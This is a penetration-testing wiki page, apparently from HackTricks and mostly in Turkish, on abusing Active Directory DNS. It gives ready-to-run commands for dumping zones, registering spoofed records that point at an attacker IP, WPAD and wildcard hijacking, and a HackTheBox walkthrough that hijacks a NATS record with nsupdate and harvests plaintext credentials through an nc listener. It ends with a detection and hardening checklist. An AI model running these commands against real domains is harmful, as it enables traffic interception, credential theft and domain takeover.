# AD DNS Kayıtları

{{#include ../../banners/hacktricks-training.md}}

Varsayılan olarak Active Directory'deki **herhangi bir kullanıcı**, Domain veya Forest DNS zone'larındaki **tüm DNS kayıtlarını** zone transferine benzer şekilde **enumerate edebilir** (kullanıcılar, bir AD ortamında DNS zone'un child object'lerini listeleyebilir).

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) aracı, iç ağların recon amacıyla zone'daki **tüm DNS kayıtlarının** **enumeration** ve **export** işlemlerini yapmayı sağlar.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (Nisan 2025), JSON/Greppable (`--json`) çıktısı, çok iş parçacıklı DNS çözümlemesi ve LDAPS'e bağlanırken TLS 1.2/1.3 desteği ekler  

Daha fazla bilgi için [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kayıt Oluşturma / Değiştirme (ADIDNS spoofing)

**Authenticated Users** grubunun varsayılan olarak zone DACL üzerinde **Create Child** izni bulunduğundan, herhangi bir domain hesabı (veya bilgisayar hesabı) ek kayıtlar kaydedebilir. Bu, trafik ele geçirme, NTLM relay zorlaması ve hatta domain'in tamamen ele geçirilmesi için kullanılabilir.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py, Impacket ≥0.12.0 ile birlikte gelir)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Yaygın saldırı ilkelleri

1. **Wildcard record** – `*.<zone>`, AD DNS sunucusunu LLMNR/NBNS spoofing'e benzer şekilde kurumsal genelinde yanıt veren bir sunucuya dönüştürür. NTLM hash'lerini yakalamak veya bunları LDAP/SMB'ye relay etmek için kötüye kullanılabilir.  (WINS-lookup devre dışı bırakılmış olmalıdır.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – `wpad` ekleyin (veya Global-Query-Block-List'i atlamak için saldırganın ana bilgisayarına işaret eden bir **NS** kaydı ekleyin) ve kimlik bilgilerini toplamak üzere giden HTTP isteklerini şeffaf bir şekilde proxy'den geçirin. Microsoft, wildcard/DNAME atlatma yöntemlerine yama uyguladı (CVE-2018-8320), ancak **NS-records hâlâ çalışıyor**.<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – Daha önce bir iş istasyonuna ait olan IP adresini alın; ilişkili DNS kaydı hâlâ çözümleneceğinden DNS'e hiç dokunmadan kaynak tabanlı kısıtlı delegation veya Shadow-Credentials saldırıları gerçekleştirebilirsiniz.    
4. **DHCP → DNS spoofing** – Varsayılan bir Windows DHCP+DNS dağıtımında, aynı alt ağdaki kimliği doğrulanmamış bir saldırgan, dinamik DNS güncellemelerini tetikleyen sahte DHCP istekleri göndererek mevcut tüm A kayıtlarının (Domain Controller'lar dâhil) üzerine yazabilir (Akamai “DDSpoof”, 2023).  Bu, Kerberos/LDAP trafiğinde machine-in-the-middle saldırısı olanağı sağlar ve alan adının tamamen ele geçirilmesine yol açabilir.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – Kontrolünüzdeki bir makine hesabının `dNSHostName` değerini değiştirin, eşleşen bir A kaydı oluşturun ve ardından DC'yi taklit etmek için bu ad için bir sertifika isteyin. **Certipy** veya **BloodyAD** gibi araçlar bu akışı tamamen otomatikleştirir.  

[serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) içeren bir AD DNS kaydı, koşullu bir relay zincirinin parçası olabilir: çağıranın kayıt oluşturma haklarına, hedef bilgisayarın bu ada kimlik doğrulaması yapmasına neden olacak bir coercion yoluna ve ortaya çıkan kimlik doğrulamasını kabul eden bir relay hedefine ihtiyacı vardır. Hedef protokolü ayrıca değerlendirin; gelen bağlantıdaki SMB signing, HTTPS WinRM hedefinin relay'i kabul edip etmediğini tek başına göstermez. Yama düzeyi, ad işleme, Extended Protection ve hizmet yapılandırması sonucu değiştirebilir.

---

### Eski dinamik kayıtlar üzerinden dahili hizmet ele geçirme (NATS vaka incelemesi)

Dinamik güncellemeler tüm kimliği doğrulanmış kullanıcılara açık olduğunda, **kayıttan kaldırılmış bir hizmet adı yeniden alınabilir ve saldırganın altyapısına yönlendirilebilir**. Mirage HTB DC'sinde, DNS scavenging sonrasında `nats-svc.mirage.htb` ana bilgisayar adı ortaya çıktı; bu nedenle düşük ayrıcalıklı herhangi bir kullanıcı şunları yapabilirdi:<sup>[[3]](#references)</sup>

1. `dig` ile **kaydı doğrulayın** ve SOA bilgisini öğrenin:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Kaydı kontrol ettikleri harici/VPN arayüzüne yönlendirecek şekilde yeniden oluşturun**:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Plaintext servisini taklit edin**. NATS istemcileri kimlik bilgilerini göndermeden önce bir `INFO { ... }` banner'ı görmeyi bekler; bu nedenle gerçek broker'dan alınmış meşru bir banner'ı kopyalamak sırları ele geçirmek için yeterlidir:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or simply sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Ele geçirilen creds ile Pivot yapın** – Mirage'da çalınan NATS hesabı JetStream erişimi sağladı ve bu erişim, yeniden kullanılabilir AD kullanıcı adları/parolaları içeren geçmiş kimlik doğrulama olaylarını açığa çıkardı.

Bu model, güvenli olmayan TCP el sıkışmalarına dayanan AD ile entegre tüm hizmetler için geçerlidir (HTTP API'leri, RPC, MQTT vb.): DNS kaydı ele geçirildiğinde saldırgan hizmetin kendisi olur.

---

## Tespit ve sağlamlaştırma

* Hassas zone'larda **Authenticated Users** için *Tüm alt nesneleri oluştur* hakkını kaldırın ve dinamik güncellemeleri DHCP tarafından kullanılan özel bir hesaba devredin.
* Dinamik güncellemeler gerekiyorsa zone'u **Secure-only** olarak ayarlayın ve yalnızca sahibi olan bilgisayar nesnesinin kendi kaydının üzerine yazabilmesi için DHCP'de **Name Protection** özelliğini etkinleştirin.
* DNS Server 257/252 (dinamik güncelleme), 770 (zone aktarımı) olay kimliklerini ve `CN=MicrosoftDNS,DC=DomainDnsZones` konumuna yapılan LDAP yazma işlemlerini izleyin.
* Tehlikeli adları (`wpad`, `isatap`, `*`) kasıtlı olarak zararsız bir kayıtla veya Global Query Block List aracılığıyla engelleyin.
* DNS sunucularını güncel tutun – örneğin, RCE açıkları CVE-2024-26224 ve CVE-2024-26231 **CVSS 9.8** puanına ulaştı ve Domain Controller'lara karşı uzaktan istismar edilebilir.  

## References

- [1] [ADIDNS Yeniden İncelendi - WPAD, GQBL ve Daha Fazlası](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DHCP DNS Dinamik Güncellemelerini Kötüye Kullanarak DNS Kayıtlarını Spoof Etme](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: NFS Leak'lerini Zincirleme, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets ve Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Zone'a Giriş: adidnsdump Kullanarak Active Directory DNS'ini Dökme](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
